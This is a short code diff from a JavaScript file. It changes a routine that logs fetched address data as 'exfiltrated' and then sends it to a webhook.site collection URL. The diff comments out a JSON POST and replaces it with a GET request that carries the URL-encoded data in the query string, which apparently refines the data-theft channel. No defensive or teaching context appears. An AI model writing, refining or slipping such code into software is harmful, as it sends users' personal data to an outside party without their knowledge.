@@ -97,12 +97,15 @@
         .then(data => {
             console.log("Address data exfiltrated:", data);
 
-            fetch("https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
+            // fetch("https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4", {
+            //     method: "POST",
+            //     headers: {
+            //         "Content-Type": "application/json"
+            //     },
+            //     body: JSON.stringify(data)
+            // });
+            fetch("https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4"+"?data=" + encodeURIComponent(JSON.stringify(data)), {
+                method: "GET"
             });
         })
         .catch(console.error);
